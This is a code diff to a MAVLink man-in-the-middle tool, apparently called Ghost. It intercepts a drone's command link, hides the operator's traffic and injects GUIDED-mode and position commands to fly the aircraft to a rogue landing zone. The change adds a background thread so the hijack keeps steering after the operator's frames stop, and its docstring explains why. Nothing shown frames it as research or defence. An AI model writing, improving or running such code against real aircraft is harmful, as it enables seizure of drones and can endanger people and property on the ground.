@@ -21,6 +21,7 @@ entirely. That gap is the objective.
 import argparse
 import math
 import sys
+import threading
 import time
 
 from pymavlink.dialects.v20 import ardupilotmega as mavlink
@@ -90,14 +91,26 @@ class Ghost:
         self.tap.send(UPLINK, self.tap.build(
             UPLINK, msg, src_system=255, src_component=190, seq=self.seq))
 
+    def command_loop(self):
+        """Drive our own cadence.
+
+        Steering must not depend on the operator still talking to us — the
+        moment we start suppressing their traffic the inbound rate drops, and
+        an attacker that only acts when a frame arrives stops flying the
+        aircraft exactly when it has taken it.
+        """
+        while True:
+            try:
+                self.take_over()
+            except Exception as exc:
+                log(f"command loop: {exc}")
+            time.sleep(0.5)
+
     def take_over(self):
         """GUIDED, then hold a position target on the rogue LZ."""
         if self.target_system is None:
             return
-        now = time.time()
-        if now - self.last_command < 0.5:
-            return
-        self.last_command = now
+        self.last_command = time.time()
 
         self.inject_up(mavlink.MAVLink_set_mode_message(
             self.target_system, MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, COPTER_GUIDED))
@@ -200,6 +213,7 @@ def main():
     log("attached — the operator now sees only what we let through")
 
     ghost = Ghost(tap, args.lat, args.lon, args.alt)
+    threading.Thread(target=ghost.command_loop, daemon=True).start()
     last_report = 0.0
 
     try:
@@ -208,8 +222,6 @@ def main():
                 ghost.on_uplink(data)
             else:
                 ghost.on_downlink(data)
-
-            ghost.take_over()
 
             if time.time() - last_report > 5:
                 last_report = time.time()
